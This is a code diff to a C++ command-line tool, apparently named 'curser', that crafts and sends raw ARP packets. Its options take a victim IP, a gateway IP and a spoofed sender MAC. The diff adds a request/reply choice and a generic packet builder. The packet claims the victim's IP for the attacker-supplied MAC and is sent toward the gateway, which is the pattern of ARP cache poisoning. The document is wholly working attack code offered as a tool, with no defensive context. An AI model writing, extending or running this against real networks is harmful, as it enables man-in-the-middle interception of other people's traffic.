@@ -9,6 +9,7 @@
 int main(int argc, char** argv) {
     static const char *usage = "Usage: curser [OPTIONS]\n"
                                 "OPTIONS:\n\t-ifn   interface name\n\t"
+                                "-op    type of packet[req/rep]\n\t"
                                 "-vpa   victim ip\n\t"
                                 "-sha   sender mac address\n\t"
                                 "-gpa   gateway ip\n\t"
@@ -19,14 +20,24 @@ int main(int argc, char** argv) {
     uint32_t gpa = 0;
     uint8_t sha[6] = {0};
     uint8_t gha[6] = {0};
+    arp_op op;
 
-    if (argc < 8) {
+    if (argc < 12) {
         std::cout << usage << std::endl;
         return EXIT_FAILURE;
     } else {
         for (int i = 1; i < argc; i++) {
             if (!std::strcmp(argv[i], "-ifn")) {
                 ifname = argv[++i];
+            } else if (!std::strcmp(argv[i], "-op")) {
+                if (!std::strcmp(argv[++i], "req")) {
+                    op = arp_op::request;
+                } else if (!std::strcmp(argv[i], "rep")) {
+                    op = arp_op::reply;
+                } else {
+                    perror("Invalid op");
+                    return EXIT_FAILURE;
+                }
             } else if (!std::strcmp(argv[i], "-vpa")) {
                 vpa = inet_bf(argv[++i]);
             } else if (!std::strcmp(argv[i], "-gpa")) {
@@ -55,22 +66,22 @@ int main(int argc, char** argv) {
     }
     
    
-    ll_endpoint ep(ifname);
+    ll_endpoint ep{ifname};
     raw_socket sock{};
     sock.bind(ep);
     
-    auto arpBuilder = ArpBuilder()
-        .set_hrd(0x0001)
-        .set_pro(0x0800)
-        .set_hln(6)
-        .set_pln(4)
-        .set_op(0x0002)
-        .set_sha(sha)
-        .set_spa(vpa)
-        .set_tha(gha)
-        .set_tpa(gpa);
+    auto pktBuilder = PktBuilder(op)
+                .set_hrd(0x0001)
+                .set_pro(0x0800)
+                .set_hln(6)
+                .set_pln(4)
+                .set_sha(sha)
+                .set_spa(vpa)
+                .set_tpa(gpa)
+                .set_tha(gha)
+                .set_op(as_integer(op));
     
-    sock.sendto(arpBuilder.packet(), arpBuilder.size());
-    std::cout << "sent arp reply on the interface " << ep << std::endl;
+    sock.sendto(pktBuilder.packet(), pktBuilder.size());
+    std::cout << "sent arp packet on the interface " << ep << std::endl;
     return EXIT_SUCCESS;
 }
